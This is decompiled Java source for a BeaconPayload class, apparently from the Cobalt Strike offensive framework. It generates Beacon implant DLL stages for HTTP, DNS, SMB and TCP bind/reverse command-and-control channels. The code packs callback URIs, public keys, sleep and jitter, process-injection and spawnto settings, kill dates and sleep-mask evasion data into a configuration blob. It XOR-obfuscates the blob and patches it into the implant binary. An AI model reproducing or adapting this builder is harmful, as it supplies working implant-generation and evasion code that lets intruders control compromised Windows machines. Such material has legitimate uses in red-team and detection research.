package beacon;

import beacon.setup.ProcessInject;
import c2profile.Profile;
import common.AssertUtils;
import common.CommonUtils;
import common.MudgeSanity;
import common.Packer;
import common.ProxyServer;
import common.ScListener;
import common.SleevedResource;
import dns.QuickSecurity;
import java.io.IOException;
import java.io.InputStream;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedList;
import pe.MalleablePE;
import pe.PEParser;

public class BeaconPayload extends BeaconConstants {
   public static final int EXIT_FUNC_PROCESS = 0;
   public static final int EXIT_FUNC_THREAD = 1;
   protected Profile c2profile = null;
   protected MalleablePE pe = null;
   protected byte[] publickey = new byte[0];
   protected ScListener listener = null;
   protected int funk = 0;

   public BeaconPayload(ScListener var1, int var2) {
      this.listener = var1;
      this.c2profile = var1.getProfile();
      this.publickey = var1.getPublicKey();
      this.pe = new MalleablePE(this.c2profile);
      this.funk = var2;
   }

   public static byte[] beacon_obfuscate(byte[] var0) {
      byte[] var1 = new byte[var0.length];

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1[var2] = (byte)(var0[var2] ^ 46);
      }

      return var1;
   }

   public byte[] exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4, String var5) {
      AssertUtils.TestSetValue(var5, "x86, x64");
      String var6 = "";
      if ("x86".equals(var5)) {
         var6 = "resources/beacon.dll";
      } else if ("x64".equals(var5)) {
         var6 = "resources/beacon.x64.dll";
      }

      return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);
   }

   public byte[] exportBeaconStageDNS(int var1, String var2, boolean var3, boolean var4, String var5) {
      AssertUtils.TestSetValue(var5, "x86, x64");
      String var6 = "";
      if ("x86".equals(var5)) {
         var6 = "resources/dnsb.dll";
      } else if ("x64".equals(var5)) {
         var6 = "resources/dnsb.x64.dll";
      }

      return this.pe.process(this.exportBeaconStage(var1, var2, var3, var4, var6), var5);
   }

   protected void setupKillDate(Settings var1) {
      var1.addShort(55, this.funk);
      if (!this.c2profile.hasString(".killdate")) {
         var1.addInt(40, 0);
      } else {
         String var2 = this.c2profile.getString(".killdate");
         String[] var3 = var2.split("-");
         int var4 = (short)CommonUtils.toNumber(var3[0], 0) * 10000;
         int var5 = (short)CommonUtils.toNumber(var3[1], 0) * 100;
         short var6 = (short)CommonUtils.toNumber(var3[2], 0);
         var1.addInt(40, var4 + var5 + var6);
      }
   }

   protected void setupGargle(Settings var1, String var2) throws IOException {
      if (!this.c2profile.option(".stage.sleep_mask")) {
         var1.addInt(41, 0);
      } else {
         PEParser var3 = PEParser.load(SleevedResource.readResource(var2));
         boolean var4 = this.c2profile.option(".stage.obfuscate");
         boolean var5 = this.c2profile.option(".stage.userwx");
         int var6 = var3.sectionEnd(".text");
         var1.addInt(41, var6);
         int var7 = var3.sectionAddress(".rdata") - var6;
         if (var7 < 256) {
            CommonUtils.print_error(".stage.sleep_mask is true; nook space in " + var2 + " is " + var7 + " bytes. Beacon will crash.");
         }

         Packer var8 = new Packer();
         var8.little();
         if (!var4) {
            var8.addInt(0);
            var8.addInt(4096);
         }

         Iterator var9 = var3.SectionsTable().iterator();

         while(true) {
            String var10;
            do {
               if (!var9.hasNext()) {
                  var8.addInt(0);
                  var8.addInt(0);
                  var1.addData(42, var8.getBytes(), (int)var8.size());
                  return;
               }

               var10 = (String)var9.next();
            } while(".text".equals(var10) && !var5);

            var8.addInt(var3.sectionAddress(var10));
            var8.addInt(var3.sectionEnd(var10));
         }
      }
   }

   protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) {
      try {
         long var6 = System.currentTimeMillis();
         byte[] var8 = SleevedResource.readResource(var5);
         if (var2.length() > 254) {
            var2 = var2.substring(0, 254);
         }

         String[] var9 = this.c2profile.getString(".http-get.uri").split(" ");
         String[] var10 = var2.split(",\\s*");
         LinkedList var11 = new LinkedList();

         for(int var12 = 0; var12 < var10.length; ++var12) {
            var11.add(var10[var12]);
            var11.add(CommonUtils.pick(var9));
         }

         String var32;
         while(var11.size() > 2 && CommonUtils.join((Collection)var11, (String)",").length() > 255) {
            var32 = var11.removeLast() + "";
            String var13 = var11.removeLast() + "";
            CommonUtils.print_info("dropping " + var13 + var32 + " from Beacon profile for size");
         }

         var32 = randua(this.c2profile);
         int var33 = Integer.parseInt(this.c2profile.getString(".sleeptime"));
         String var14 = CommonUtils.pick(this.c2profile.getString(".http-post.uri").split(" "));
         byte[] var15 = this.c2profile.recover_binary(".http-get.server.output");
         byte[] var16 = this.c2profile.apply_binary(".http-get.client");
         byte[] var17 = this.c2profile.apply_binary(".http-post.client");
         int var18 = this.c2profile.size(".http-get.server.output", 1048576);
         int var19 = Integer.parseInt(this.c2profile.getString(".jitter"));
         if (var19 < 0 || var19 > 99) {
            var19 = 0;
         }

         int var20 = Integer.parseInt(this.c2profile.getString(".maxdns"));
         if (var20 < 0 || var20 > 255) {
            var20 = 255;
         }

         int var21 = 0;
         if (var3) {
            var21 |= 1;
         }

         if (var4) {
            var21 |= 8;
         }

         long var22 = CommonUtils.ipToLong(this.c2profile.getString(".dns_idle"));
         int var24 = Integer.parseInt(this.c2profile.getString(".dns_sleep"));
         Settings var25 = new Settings();
         var25.addShort(1, var21);
         var25.addShort(2, var1);
         var25.addInt(3, var33);
         var25.addInt(4, var18);
         var25.addShort(5, var19);
         var25.addShort(6, var20);
         var25.addData(7, this.publickey, 256);
         var25.addString(8, CommonUtils.join((Collection)var11, (String)","), 256);
         var25.addString(9, var32, 128);
         var25.addString(10, var14, 64);
         var25.addData(11, var15, 256);
         var25.addData(12, var16, 256);
         var25.addData(13, var17, 256);
         var25.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var25.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var25.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var25.addString(15, "", 128);
         var25.addShort(31, QuickSecurity.getCryptoScheme());
         var25.addInt(19, (int)var22);
         var25.addInt(20, var24);
         var25.addString(26, this.c2profile.getString(".http-get.verb"), 16);
         var25.addString(27, this.c2profile.getString(".http-post.verb"), 16);
         var25.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
         var25.addInt(37, this.c2profile.getInt(".watermark"));
         var25.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var25.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         String var26 = this.listener.getHostHeader();
         if (var26 != null && var26.length() != 0) {
            if (Profile.usesHostBeacon(this.c2profile)) {
               var25.addString(54, "", 128);
            } else {
               var25.addString(54, "Host: " + this.listener.getHostHeader() + "\r\n", 128);
            }
         } else {
            var25.addString(54, "", 128);
         }

         if (Profile.usesCookieBeacon(this.c2profile)) {
            var25.addShort(50, 1);
         } else {
            var25.addShort(50, 0);
         }

         ProxyServer var27 = ProxyServer.parse(this.listener.getProxyString());
         var27.setup(var25);
         this.setupKillDate(var25);
         this.setupGargle(var25, var5);
         (new ProcessInject(this.c2profile)).apply(var25);
         byte[] var28 = var25.toPatch();
         var28 = beacon_obfuscate(var28);
         String var29 = CommonUtils.bString(var8);
         int var30 = var29.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var29 = CommonUtils.replaceAt(var29, CommonUtils.bString(var28), var30);
         return CommonUtils.toBytes(var29);
      } catch (IOException var31) {
         MudgeSanity.logException("export Beacon stage: " + var5, var31, false);
         return new byte[0];
      }
   }

   public byte[] exportReverseTCPStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportTCPDLL("resources/pivot.x64.dll", "reverse"), var1) : this.pe.process(this.exportTCPDLL("resources/pivot.dll", "reverse"), var1);
   }

   public byte[] exportBindTCPStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportTCPDLL("resources/pivot.x64.dll", "bind"), var1) : this.pe.process(this.exportTCPDLL("resources/pivot.dll", "bind"), var1);
   }

   public byte[] exportSMBStage(String var1) {
      return var1.equals("x64") ? this.pe.process(this.exportSMBDLL("resources/pivot.x64.dll"), var1) : this.pe.process(this.exportSMBDLL("resources/pivot.dll"), var1);
   }

   public byte[] exportSMBDLL(String var1) {
      try {
         long var2 = System.currentTimeMillis();
         byte[] var4 = SleevedResource.readResource(var1);
         String var5 = this.listener.getPipeName(".");
         Settings var6 = new Settings();
         var6.addShort(1, 2);
         var6.addShort(2, 4444);
         var6.addInt(3, 10000);
         var6.addInt(4, 1048576);
         var6.addShort(5, 0);
         var6.addShort(6, 0);
         var6.addData(7, this.publickey, 256);
         var6.addString(8, "", 256);
         var6.addString(9, "", 128);
         var6.addString(10, "", 64);
         var6.addString(11, "", 256);
         var6.addString(12, "", 256);
         var6.addString(13, "", 256);
         var6.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var6.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var6.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var6.addString(15, var5, 128);
         var6.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var6);
         var6.addInt(37, this.c2profile.getInt(".watermark"));
         var6.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var6.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var6, var1);
         (new ProcessInject(this.c2profile)).apply(var6);
         byte[] var7 = var6.toPatch();
         var7 = beacon_obfuscate(var7);
         String var8 = CommonUtils.bString(var4);
         int var9 = var8.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var8 = CommonUtils.replaceAt(var8, CommonUtils.bString(var7), var9);
         return CommonUtils.toBytes(var8);
      } catch (IOException var10) {
         MudgeSanity.logException("export SMB DLL", var10, false);
         return new byte[0];
      }
   }

   public byte[] exportTCPDLL(String var1, String var2) {
      AssertUtils.TestSetValue(var2, "bind, reverse");

      try {
         long var3 = System.currentTimeMillis();
         byte[] var5 = SleevedResource.readResource(var1);
         Settings var6 = new Settings();
         if ("bind".equals(var2)) {
            var6.addShort(1, 16);
         } else {
            var6.addShort(1, 4);
         }

         var6.addShort(2, this.listener.getPort());
         var6.addInt(3, 10000);
         var6.addInt(4, 1048576);
         var6.addShort(5, 0);
         var6.addShort(6, 0);
         var6.addData(7, this.publickey, 256);
         if ("bind".equals(var2)) {
            if (this.listener.isLocalHostOnly()) {
               var6.addInt(49, (int)CommonUtils.ipToLong("127.0.0.1"));
            } else {
               var6.addInt(49, (int)CommonUtils.ipToLong("0.0.0.0"));
            }
         } else {
            var6.addString(8, this.listener.getStagerHost(), 256);
         }

         var6.addString(9, "", 128);
         var6.addString(10, "", 64);
         var6.addString(11, "", 256);
         var6.addString(12, "", 256);
         var6.addString(13, "", 256);
         var6.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var6.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var6.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var6.addString(15, "", 128);
         var6.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var6);
         var6.addInt(37, this.c2profile.getInt(".watermark"));
         var6.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var6.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var6, var1);
         (new ProcessInject(this.c2profile)).apply(var6);
         byte[] var7 = var6.toPatch();
         var7 = beacon_obfuscate(var7);
         String var8 = CommonUtils.bString(var5);
         int var9 = var8.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var8 = CommonUtils.replaceAt(var8, CommonUtils.bString(var7), var9);
         return CommonUtils.toBytes(var8);
      } catch (IOException var10) {
         MudgeSanity.logException("export TCP DLL", var10, false);
         return new byte[0];
      }
   }

   public static String randua(Profile var0) {
      if (var0.getString(".useragent").equals("<RAND>")) {
         try {
            InputStream var1 = CommonUtils.resource("resources/ua.txt");
            String var2 = CommonUtils.pick(CommonUtils.bString(CommonUtils.readAll(var1)).split("\n"));
            var1.close();
            return var2;
         } catch (IOException var3) {
            MudgeSanity.logException("randua", var3, false);
            return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";
         }
      } else {
         return var0.getString(".useragent");
      }
   }
}
